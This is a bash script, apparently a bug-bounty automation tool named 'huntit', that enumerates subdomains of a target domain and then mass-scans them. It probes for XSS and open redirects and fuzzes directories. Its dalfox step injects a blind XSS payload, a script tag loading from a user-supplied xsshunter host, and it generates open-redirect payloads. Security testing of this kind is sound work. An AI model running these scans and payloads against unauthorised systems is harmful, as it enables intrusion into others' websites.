#!/bin/bash

set -e

#@> VARIABLES
version="1.0.0"
huntitDIR=`cd "$(dirname "$0")" && pwd`

#@> COLORS
GREEN=`tput setaf 2`
RED=`tput setaf 1`
NC=`tput sgr0`

#@> EXIT SCRIPT FUNCTION
trap ctrl_c INT
function ctrl_c() {
  echo -e "\n${RED}[!]${NC} Interrupted, ${GREEN}CTRL${NC}+${GREEN}C${NC} pressed! ${RED}Exiting${NC} huntit..."
  echo -en "\e[?25h"
  exit 0;
}

#@> USAGE GUIDE
usage() {
  echo -e "\n${GREEN}Usage:${NC}"
  echo "   Required: Input the top level domain and your blind payload from https://xsshunter.com"
  echo "   Optional: Input an out-of-scope subdomain list and an in-scope subdomain list"
  echo "   Required Syntax: huntit ${RED}-d${NC} ${GREEN}tesla.com${NC} ${RED}-b${NC} ${GREEN}https://blindxss.xss.ht${NC}"
  echo "   Optional Syntax: huntit ${RED}-d${NC} ${GREEN}tesla.com${NC} ${RED}-b${NC} ${GREEN}https://blindxss.xss.ht${NC} ${RED}-ol${NC} ${GREEN}offScopeList.txt${NC} ${RED}-il${NC} ${GREEN}inScopeList.txt${NC}"
  echo ""
  echo "${GREEN}Flags:${NC}"
  echo "   -d,  --domain                  string     Add your target top domain            -d tesla.com"
  echo "   -b,  --blind                   string     Add your xsshunter blind xss file     -b https://yourUserAccount.xss.ht"
  echo "   -ol, --off-scope               string     Add out of scope subdomains list      -ol offScopeList.txt"
  echo "   -il, --in-scope                string     Add in scope subdomain list           -il inScopeList.txt"
  echo "   -u,  --update-requirements                Updates required tools for huntit"
  echo "   -h,  --help                               Help for huntit"
  echo "   -v,  --version                            Your current huntit version"
}

#@> USER ARGUMENTS HANDLER AND MORE VARIABLES
while [ -n "$1" ]; do
  case $1 in
    -d|--domain)
      domain=$2
      shift ;;
    -b|--blind)
      blind=$2
      shift ;;
    -il|--in-scope)
      inScopeList=$2
      shift ;;  
    -ol|--off-scope)
      offScopeList=$2
      shift ;;
    -u|--update-requirements)
      "$huntitDIR"/huntitRequirements.sh -u
      shift ;;
    -h|--help)
      usage
      exit 0 ;;
    -v|--version)
      echo -e "\n${GREEN}[!]${NC} Version: ${GREEN}$version${NC}"
      exit 0 ;;
    *)
      echo -e "\n${RED}[-]${NC} You typed an invalid argument!"
      echo "${GREEN}[!]${NC} Please read the usage below."
      usage
      exit 0 ;;
  esac
  shift
done

#@> SYNTAX CHECKER START
if [ "$domain" == "" ] || [[ ! "$blind" =~ ^https://.*$ ]]; then
  echo -e "\n${RED}[-]${NC} Your need to fix your syntax!"
  echo "${GREEN}[!]${NC} Please read the usage below."
  usage
  exit 0;
else

#@> RUNTIME START
start=`date +%s`

#@> MAKING DIRECTORIES SECTION
mkdirectoriesTask() {
  if [ ! -d /tmp/huntit ];                                          then mkdir /tmp/huntit ; fi
  if [ ! -d ~/Documents ];                                          then mkdir ~/Documents ; fi
  if [ ! -d ~/Documents/BBHunt ];                                   then mkdir ~/Documents/BBHunt ; fi
  if [ ! -d ~/Documents/BBHunt/$domain ];                           then mkdir ~/Documents/BBHunt/$domain ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/RawFiles ];                  then mkdir ~/Documents/BBHunt/$domain/RawFiles ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/Gowitness ];                 then mkdir ~/Documents/BBHunt/$domain/Gowitness ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/OpenRedirectPayloads ];      then mkdir ~/Documents/BBHunt/$domain/OpenRedirectPayloads ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/HostsSitemap ];              then mkdir ~/Documents/BBHunt/$domain/HostsSitemap ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/ffuf ];                      then mkdir ~/Documents/BBHunt/$domain/ffuf ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/ffuf/CustomDir ];            then mkdir ~/Documents/BBHunt/$domain/ffuf/CustomDir ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/ffuf/CustomDir/gron ];       then mkdir ~/Documents/BBHunt/$domain/ffuf/CustomDir/gron ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/ffuf/CommonDir ];            then mkdir ~/Documents/BBHunt/$domain/ffuf/CommonDir ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/ffuf/CommonDir/gron ];       then mkdir ~/Documents/BBHunt/$domain/ffuf/CommonDir/gron ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/ffuf/AdvancedDir ];          then mkdir ~/Documents/BBHunt/$domain/ffuf/AdvancedDir ; fi 
  if [ ! -d ~/Documents/BBHunt/$domain/ffuf/AdvancedDir/gron ];     then mkdir ~/Documents/BBHunt/$domain/ffuf/AdvancedDir/gron ; fi
  if [ ! -d ~/Documents/BBHunt/$domain/Nmap ];                      then mkdir ~/Documents/BBHunt/$domain/Nmap ; fi

  #@> VARIABLES
  targetDIR=`cd ~/Documents/BBHunt/$domain && pwd`
}

#@> TOOLS SECTION
assetfinderTask() {
  echo -e "\n${GREEN}[+]${NC} Harvesting subdomains using assetfinder..."
  assetfinder --subs-only $domain | grep -i $domain | sort -u > "$targetDIR"/RawFiles/assetfinderRaw.txt

  if [ "$inScopeList" == "" ]; then
    return
  else
    echo -e "\n${GREEN}[+]${NC} Appending in-scope subdomain list inside assetfinder results..."
    cat $inScopeList >> "$targetDIR"/RawFiles/assetfinderRaw.txt
    sort -o "$targetDIR"/RawFiles/assetfinderRaw.txt -u "$targetDIR"/RawFiles/assetfinderRaw.txt
  fi

  if [ "$offScopeList" == "" ]; then
    return
  else
    echo -e "\n${GREEN}[+]${NC} Removing out-of-scope subdomain list out of assetfinder results..."
    for line in $(cat $offScopeList); do
      cat "$targetDIR"/RawFiles/assetfinderRaw.txt > "$targetDIR"/RawFiles/"$line".tmp
      cat "$targetDIR"/RawFiles/"$line".tmp | grep -viE $line | sort -u > "$targetDIR"/RawFiles/assetfinderRaw.txt
      rm -f "$targetDIR"/RawFiles/"$line".tmp
    done
  fi
}

httprobeTask() {
  echo -e "\n${GREEN}[+]${NC} Probing for alive hosts using httprobe..."
  cat "$targetDIR"/RawFiles/assetfinderRaw.txt | httprobe -prefer-https | grep -i $domain | sort -u | tee "$targetDIR"/aliveHostsHTTPandHTTPS.txt
  cat "$targetDIR"/aliveHostsHTTPandHTTPS.txt | sed 's/http\?:\/\///' | sed 's/https\?:\/\///' > "$targetDIR"/aliveHosts.txt
}

gowitnessTask() {
  echo -e "\n${GREEN}[+]${NC} Taking screenshots of alive hosts using gowitness..."
  gowitness file -f "$targetDIR"/aliveHostsHTTPandHTTPS.txt --delay 5 --disable-db --threads 4 --resolution-x 1200 --resolution-y 750  --timeout 10 --screenshot-path "$targetDIR"/Gowitness
}

waybackurlsTask() {
  echo -e "\n${GREEN}[+]${NC} Searching for archived urls of alive hosts using waybackurls..."
  cat "$targetDIR"/aliveHostsHTTPandHTTPS.txt | waybackurls | sort -u > "$targetDIR"/RawFiles/waybackurlsRaw.txt
}

paramspiderTask() {
  echo -e "\n${GREEN}[+]${NC} Searching for parameters using paramspider..."
  "$huntitDIR"/ThirdPartyTools/ParamSpider/paramspider.py -d $domain -o /tmp/huntit/paramspider.tmp --retries 2 --level high --exclude js,txt,gif,jpg,jpeg,css,tiff,ico,png,svg,ttf,woff,woff2,eot,pdf,zip,rar,tar,tgz | grep 'FUZZ' | sed 's/\<FUZZ\>//g' | sed '/^$/d' | sort -u > "$targetDIR"/RawFiles/paramspiderRaw.txt
}

processingWaybackdataTask() {
  echo -e "\n${GREEN}[+]${NC} Merging waybackurls and paramspider into waybackdata, also deleting duplicates..."
  cat "$targetDIR"/RawFiles/waybackurlsRaw.txt "$targetDIR"/RawFiles/paramspiderRaw.txt | sed '/^$/d' | sort -u > "$targetDIR"/waybackdata.txt
  
  echo -e "\n${GREEN}[+]${NC} Removing blog subdomains from waybackdata..."
  cat "$targetDIR"/waybackdata.txt | grep -vi 'blog.' | sort -u > "$targetDIR"/waybackdata.tmp
  cat "$targetDIR"/waybackdata.tmp > "$targetDIR"/waybackdata.txt && rm -f "$targetDIR"/waybackdata.tmp

  echo -e "\n${GREEN}[+]${NC} Extracting parameters from waybackdata to create a custom parameters wordlist using unfurl..."
  cat "$targetDIR"/waybackdata.txt | unfurl format %q | cut -d "=" -f1 | sort -u >> "$huntitDIR"/Wordlists/huntitCustomParams.txt
  sort -o "$huntitDIR"/Wordlists/huntitCustomParams.txt -u "$huntitDIR"/Wordlists/huntitCustomParams.txt
  
  echo -e "\n${GREEN}[+]${NC} Extracting directories from waybackdata to create a custom directories wordlist using unfurl..."
  cat "$targetDIR"/waybackdata.txt | unfurl paths | sed 's#/#\n#g' | sed '/^$/d' | grep -vE '\..*$' | grep -v '%' | sort -u >> "$huntitDIR"/Wordlists/huntitCustomDirectories.txt
  
  echo -e "\n${GREEN}[+]${NC} Appending the default directories and paths wordlist from tomnomnom over the custom directories wordlist..."
  cat "$huntitDIR"/Wordlists/huntitCustomDirectories.txt "$huntitDIR"/Wordlists/huntitDefaultDirectoriesAndPaths.txt | sort -u >> "$huntitDIR"/Wordlists/huntitCustomDirectories.txt
  sort -o "$huntitDIR"/Wordlists/huntitCustomDirectories.txt -u "$huntitDIR"/Wordlists/huntitCustomDirectories.txt

  if [ "$offScopeList" == "" ]; then
    return
  else
    echo -e "\n${GREEN}[+]${NC} Removing out-of-scope subdomains inside waybackdata..."
    for line in $(cat $offScopeList); do
      cat "$targetDIR"/waybackdata.txt > "$targetDIR"/RawFiles/"$line".tmp
      cat "$targetDIR"/RawFiles/"$line".tmp | grep -viE $line | sort -u > "$targetDIR"/waybackdata.txt
      rm -f "$targetDIR"/RawFiles/"$line".tmp
    done
  fi
  cat "$targetDIR"/waybackdata.txt | sed 's/\:80\|\:8080\|\:443//' | sort -u > "$targetDIR"/waybackdata.tmp
  cat "$targetDIR"/waybackdata.tmp > "$targetDIR"/waybackdata.txt && rm -f "$targetDIR"/waybackdata.tmp
}

parseSitemapXML() {
  echo -e "\n${GREEN}[+]${NC} Parsing sitemap.xml from all hosts and appending found directories to the custom directories wordlist..."
  for line in $(cat "$targetDIR"/aliveHostsHTTPandHTTPS.txt); do
    host=$(echo $line | sed 's/http\?:\/\///' | sed 's/https\?:\/\///')
    echo -e "\n${GREEN}[!]${NC} Host: $line/sitemap.xml"
    urls=$(curl -Ls "$line"/sitemap.xml | grep "<loc>" | awk -F"<loc>" '{print $2}' | awk -F"</loc>" '{print $1}')
    for i in $urls
    do
      echo "$i" | tee -a "$targetDIR"/HostsSitemap/"$host".txt
    done
    
    if [[ -f "$targetDIR"/HostsSitemap/"$host".txt ]]; then
      cat "$targetDIR"/HostsSitemap/"$host".txt | unfurl paths | sed 's#/#\n#g' | sed '/^$/d' | sort -u >> "$huntitDIR"/Wordlists/huntitCustomDirectories.txt
      sort -o "$huntitDIR"/Wordlists/huntitCustomDirectories.txt -u "$huntitDIR"/Wordlists/huntitCustomDirectories.txt
    else
      continue
    fi
  done
}

gf_xssTask() {
  echo -e "\n${GREEN}[+]${NC} Greping for XSS patterns in waybackdata using gf xss..."
  cat "$targetDIR"/waybackdata.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | sort -u > "$targetDIR"/gf_xss.txt
}

GxssTask() {
  echo -e "\n${GREEN}[+]${NC} Checking reflecting parameters in waybackdata grepped by gf xss using Gxss..."
  cat "$targetDIR"/gf_xss.txt | httpx -silent | Gxss -c 100 -p FUZZ -o "$targetDIR"/RawFiles/GxssRaw.txt
  cat "$targetDIR"/RawFiles/GxssRaw.txt | grep 'FUZZ' | sed 's/\<FUZZ\>//g' | sort -u > "$targetDIR"/gf_xss_gxss.txt
  rm -f "$targetDIR"/RawFiles/GxssRaw.txt
}

gf_redirectTask() {
  echo -e "\n${GREEN}[+]${NC} Greping for redirect patterns in waybackdata using gf redirect..."
  cat "$targetDIR"/waybackdata.txt | gf redirect | sort -u > "$targetDIR"/gf_redirect.txt
}

redirectPayloadGeneratorTask() {
  echo -e "\n${GREEN}[+]${NC} Generating handcrafted open redirect payloads..."
  for line in $(cat "$targetDIR"/aliveHosts.txt); do
    sed 's/www.whitelisteddomain.tld/'"$line"'/' "$huntitDIR"/Payloads/openRedirectPayloadRaw.txt > "$targetDIR"/OpenRedirectPayloads/"$line".tmp
    sed 's/@www.whitelisteddomain.tld/@'"$line"'/' "$targetDIR"/OpenRedirectPayloads/"$line".tmp > "$targetDIR"/OpenRedirectPayloads/"$line".txt
    echo "$line" | awk -F\. '{print "//not"$(NF-1) FS $NF}' >> "$targetDIR"/OpenRedirectPayloads/"$line".txt
    echo "$line" | awk -F. '{print "https://"$0"."$NF"/"}' >> "$targetDIR"/OpenRedirectPayloads/"$line".txt
    rm -f "$targetDIR"/OpenRedirectPayloads/"$line".tmp
  done
}

megTask() {
  echo -e "\n${GREEN}[+]${NC} Scanning alive hosts for tomnomnom's short-wordlist using meg..."
  meg --verbose --concurrency 100 --delay 1000 --savestatus 200 "$huntitDIR"/Wordlists/short-wordlist-tomnomnom.txt "$targetDIR"/aliveHostsHTTPandHTTPS.txt "$targetDIR"/meg
}

dalfoxGxssTask() {
  echo -e "\n${GREEN}[+]${NC} Searching for XSS vulnerabilities of waybackdata grepped by gf xss and filtered by Gxss using dalfox..."
  cat "$targetDIR"/gf_xss_gxss.txt | dalfox pipe --mass --blind '"><script src=$blind></script>' --follow-redirects | cut -d " " -f 2 > "$targetDIR"/RawFiles/poc_xssRaw.txt
  cat "$targetDIR"/RawFiles/poc_xssRaw.txt | sed 's/\x1b\[[0-9;]*m//g' | sort -u > "$targetDIR"/poc_xss.txt
  rm -f "$targetDIR"/RawFiles/poc_xssRaw.txt
}

dalfoxRedirectTask() {
  echo -e "\n${GREEN}[+]${NC} Searching for redirect vulnerabilities of waybackdata grepped by gf redirect using dalfox..."
  cat "$targetDIR"/gf_redirect.txt | dalfox pipe --mass --debug --skip-grepping --skip-mining-all --skip-headless --skip-xss-scanning -o "$targetDIR"/RawFiles/poc_redirectRaw.txt
  cat "$targetDIR"/RawFiles/poc_redirectRaw.txt | grep -i 'Found Open Redirect' | sed 's/\x1b\[[0-9;]*m//g' | sed 's/\[G\] Found Open Redirect\. Payload\: //' | sort -u > "$targetDIR"/poc_redirect.txt
  rm -f "$targetDIR"/RawFiles/poc_redirectRaw.txt
}

ffufCustomDirectoriesTask() {
  echo -e "\n${GREEN}[+]${NC} Fuzzing recursively all hosts using the custom directories wordlist using ffuf..."
  for line in $(cat "$targetDIR"/aliveHostsHTTPandHTTPS.txt); do
  host=$(echo $line | sed 's/http\?:\/\///' | sed 's/https\?:\/\///')
  echo -e "\n${GREEN}[!]${NC} Fuzzing recursively: ${host}"
  ffuf -u "$line"/FUZZ -w "$huntitDIR"/Wordlists/huntitCustomDirectories.txt -ac -v -c -fl 4 -mc 200 -recursion -recursion-depth 4 -recursion-strategy greedy -o "$targetDIR"/ffuf/CustomDir/"$host".json
  gron "$targetDIR"/ffuf/CustomDir/"$host".json > "$targetDIR"/ffuf/CustomDir/gron/"$host".txt
  done
}

ffufCommonDirectoriesTask() {
  echo -e "\n${GREEN}[+]${NC} Fuzzing non-recursively all hosts using the common directories and paths wordlist using ffuf..."
  for line in $(cat "$targetDIR"/aliveHostsHTTPandHTTPS.txt); do
    host=$(echo $line | sed 's/http\?:\/\///' | sed 's/https\?:\/\///')
    echo -e "\n${GREEN}[!]${NC} Fuzzing non-recursively: ${host}"
    ffuf -u "$line"/DIR -w "$huntitDIR"/Wordlists/huntitCommonDirectoriesAndPaths.txt:DIR -ac -r -t 100 -v -c -fl 4 -mc 200 -o "$targetDIR"/ffuf/CommonDir/"$host".json
    gron "$targetDIR"/ffuf/CommonDir/"$host".json > "$targetDIR"/ffuf/CommonDir/gron/"$host".txt
  done
}

ffufAdvancedDirectoriesTask() {
  echo -e "\n${GREEN}[+]${NC} Fuzzing non-recursively all hosts using the advanced directories and paths wordlist using ffuf..."
  for line in $(cat "$targetDIR"/aliveHostsHTTPandHTTPS.txt); do
    host=$(echo $line | sed 's/http\?:\/\///' | sed 's/https\?:\/\///')
    echo -e "\n${GREEN}[!]${NC} Fuzzing non-recursively: ${host}"
    ffuf -u "$line"/DIR -w "$huntitDIR"/Wordlists/huntitAdvancedDirectoriesAndPaths.txt:DIR -ac -r -t 100 -v -c -fl 4 -mc 200 -o "$targetDIR"/ffuf/AdvancedDir/"$host".json
    gron "$targetDIR"/ffuf/AdvancedDir/"$host".json > "$targetDIR"/ffuf/AdvancedDir/gron/"$host".txt
  done
}

rustscanTask() {
  echo -e "\n${GREEN}[+]${NC} Scanning alive hosts for Open Ports using rustscan..."
  rustscan --addresses "$targetDIR"/aliveHosts.txt --batch-size 2048 --ulimit 4096 --timeout 2000 --tries 3 --range 1-65535 -- -Pn -sT -A -sC --scan-delay 500ms --max-retries 3 -oA "$targetDIR"/Nmap/rustscanPortsAliveDomains --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl
}

finalInformationsTask() {
  #@> RUNTIME END
  end=`date +%s`
  runtime=$((end-start))

  #@> FINAL INFORMATIONS
  echo -e "\n------------------------------------------------------------------\n"
  echo "${GREEN}[!]${NC} Your custom wordlists will grow each time you scan a new target"
  echo "[=] Done: Process Complete! Results can be found at ${GREEN}~/Documents/BBHunt/$domain/${NC}"
  echo -e "[=] Total runtime: ${RED}${runtime}s${NC}"
}

#@> FUNCTIONS CONTROLLER | ON and OFF switches (Respect order)
huntit() {
  mkdirectoriesTask # <- This function needs to stay always ON
  # ------------------------------------------------------------------
  assetfinderTask
  httprobeTask
  gowitnessTask
  waybackurlsTask
  paramspiderTask
  processingWaybackdataTask
  parseSitemapXML
  gf_xssTask
  GxssTask
  gf_redirectTask
  redirectPayloadGeneratorTask
  megTask
  dalfoxGxssTask
  dalfoxRedirectTask
  # ------------------------------------------------------------------
  #@> EXTRA TOOLS (After running the functions above, comment them out before running extras)
  # ffufCustomDirectoriesTask
  # ffufCommonDirectoriesTask
  # ffufAdvancedDirectoriesTask
  # rustscanTask
  # ------------------------------------------------------------------
  finalInformationsTask # <- This function needs to stay always ON
}

#@> CALLING FUNCTIONS CONTROLLER
huntit

#@> SYNTAX CHECKER END
fi
